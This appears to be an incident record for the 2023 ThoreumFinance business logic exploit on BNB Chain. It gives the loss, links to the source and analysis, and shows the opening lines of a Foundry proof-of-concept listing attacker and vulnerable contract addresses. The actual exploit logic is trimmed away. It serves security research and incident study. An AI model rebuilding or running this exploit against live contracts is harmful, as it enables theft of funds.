# [?] - ThoreumFinance - business logic flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: ThoreumFinance
Published: 2023-01-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/ThoreumFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~2000 BNB

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~2000 BNB (6 BNB in this tx)
// Attacker : 0x1ae2dc57399b2f4597366c5bf4fe39859c006f99
// Attack Contract : 0x7d1e1901226e0ba389bfb1281ede859e6e48cc3d
// Vulnerable Contract : 0xce1b3e5087e8215876af976032382dd338cf8401
// Attack Tx : https://bscscan.com/tx/0x3fe3a1883f0ae263a260f7d3e9b462468f4f83c2c88bb89d1dee5d7d24262b51

// @Info
// Vulnerable Contract Code : https://bscscan.com/token/0xce1b3e5087e8215876af976032382dd338cf8401#code

// @Analysis
// Ancilia : https://twitter.com/AnciliaInc/status/1615944396134043648

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakeRouter constant router = IPancakeRouter(payable(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8));

address constant wbnb_addr = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant thoreum_addr = 0xCE1b3e5087e8215876aF976032382dd338cF8401;
address constant wbnb_thoreum_lp_addr = 0xd822E1737b1180F72368B2a9EB2de22805B67E34;
address constant exploiter = 0x1285FE345523F00AB1A66ACD18d9E23D18D2e35c;
IWBNB constant wbnb = IWBNB(payable(wbnb_addr));
THOREUMInterface constant THOREUM = THOREUMInterface(thoreum_addr);

contract Attacker is Test {
    //  forge test --contracts ./src/test/ThoreumFinance_exp.sol -vvv
    function setUp() public {
        cheat.label(address(router), "router");
        cheat.label(thoreum_addr, "thoreum");
        cheat.label(exploiter, "exploiter");
        cheat.label(wbnb_addr, "wbnb");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/ThoreumFinance_exp.sol_
